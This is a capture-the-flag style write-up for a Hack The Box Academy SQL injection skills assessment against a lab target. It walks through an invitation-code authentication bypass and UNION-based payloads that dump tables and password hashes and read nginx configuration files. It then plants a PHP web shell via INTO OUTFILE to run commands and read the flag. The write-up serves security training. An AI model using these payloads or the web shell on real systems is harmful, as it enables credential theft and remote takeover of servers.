## Purpose:

This writeup detalis how to solve the Skills Assessment for the SQL Injection Fundamentals module from Hack THe Box Acadmey.

## Getting Started:
After starting the target, and pasting the ip in the browser youll notice that that the page doesnt load.

- You'll need to ignore the SSL Certificate to go to the page.

## Recon:

Lets find out some basic info about our target:

    whatweb https://154.57.164.77:32252

- This will reveal that the webserver is nginx/1.22.1

## Create Account:

Once you are at the webpage click on the "create account" tab navigate to register.php.

- The form will not let you create an account without an "invitation code".

  - However the name="invitationCode" param is vulnerable to an SQL injection.

    - You can bypass the invitationCode requirment with the payload: ' or ''='
   
    - The browser will not let you fillout the form, but using req.py or a proxy like Burp Suite, we can circumvent this restriction and send data to the server.
   
  - Notice that the registration form inclueds the following action param:
   
        <form action="/api/register.php" method="POST" id="registrationForm">

      We will need to send the request to: ip:port/api/register.php

You will have successfully created an account when you see this line in the Responce:

    Location: /login.php?s=account+created+successfully!

Explanation:

- The input is:

      invitationCode=' or ''='

- A likly query is:

      SELECT * FROM invites WHERE code = '$invitationCode

- Leading to:

      SELECT * FROM invites WHERE code = '' OR ''=''

- Note:

  - This exploit also allows us to create accounts with '' as the password, or with missmatched password inputs.

## Formatting An SQL Injection:

The "search in conversation" input field uses a GET request to retrieve data from the database. This represents a potential injection point.

Lets start by determine the number of columns we are working with

- We can do so with this injection:

      ') UNION SELECT 1,2,3,4-- -

- This allows us to break out of the original query with ')
- Then the UNION SELECT aligns the columns
- The result shows that columns "3" and "4" are displayed, and can be used to leak information

<img width="1282" height="445" alt="chattr1" src="https://github.com/user-attachments/assets/62606693-24af-4058-9f0b-a981d4dbd094" />


Lets try a basic exploit to find the database name with this injection:

    ') UNION SELECT 1,2,database(),4 FROM INFORMATION_SCHEMA.SCHEMATA #

- This returns: chattr

<img width="1282" height="445" alt="chattr2" src="https://github.com/user-attachments/assets/705aabe0-e1bc-4fee-acdd-471273234a79" />


## Finding The Admin Password:

Now lets enumerate the databases and tables, we can do that with:

    ') UNION SELECT 1,2,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES-- -

- This returns a long list of information but lets focus on the following:
  - Table: Users
  - Database: chattr 

The next step is to get the column names for the "Users" table:

    ') UNION SELECT 1,2,COLUMN_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="Users"-- - 

Lets inspect the "Username" and "Password"

    ') UNION SELECT 1,2,Username,Password FROM chattr.Users-- -

- This gives us the password hashes!


Next, lets see what permissions are avalible with the payload:

    ') UNION SELECT 1,2,GRANTEE,PRIVILEGE_TYPE FROM information_schema.USER_PRIVILEGES-- -

  <------ Include image ------>

- This shows that user 'chattr_dbUser'@'localhost' has "FILE" permissions, meaning that we can read and write files.

  - In the Recon stage we saw that the webserver is "nginx".
  - Knowing this we can try to read the servers configuration file:

        ') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/nginx.conf"),4-- -

<img width="1002" height="596" alt="conf" src="https://github.com/user-attachments/assets/30a27e33-180b-4612-9578-38fdb363ac51" />

- There is a lot in the output, but lets focus on this:

<img width="1002" height="596" alt="conf_path" src="https://github.com/user-attachments/assets/0320c4f7-f678-46a3-8c58-6b41b4a0b507" />


  - This tells us where the virtual hosts live

  - The * is a placeholder, by knowing how 
 
- Now we have what we need to read the host file:

        ') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -

    <img width="1002" height="583" alt="webroot" src="https://github.com/user-attachments/assets/6e2503c4-21d0-4549-90b7-7c85b48cb49d" />

    - The webroot is: /var/www/chattr-prod

## Remote Code Execution:

Given that we have write permissions, let write some malicious code on the server.

    ') UNION SELECT "","",'<?php system($_REQUEST[0]); ?>',"" into outfile "/var/www/chattr-prod/fSociety.php"-- -

- This will allow us to send commands through the url.
    - For exampe lets list the files in the root directory (make sure to URL encode your command)
    - Command: ls /
 
            https://154.57.164.78:32157/fSociety.php?0=ls%20/

    <img width="1002" height="345" alt="rootDir" src="https://github.com/user-attachments/assets/38d16ccd-c39d-4350-a942-75e149d5d831" />

    - The file "flag_876a4c.txt", looks interesting, lets read it.

            https://154.57.164.78:32157/fSociety.php?0=cat%20/flag_876a4c.txt

    <img width="1002" height="345" alt="flag" src="https://github.com/user-attachments/assets/1d4b3426-376d-4dd4-acea-3dc415873d36" />

    - And with that, we've got the flag!
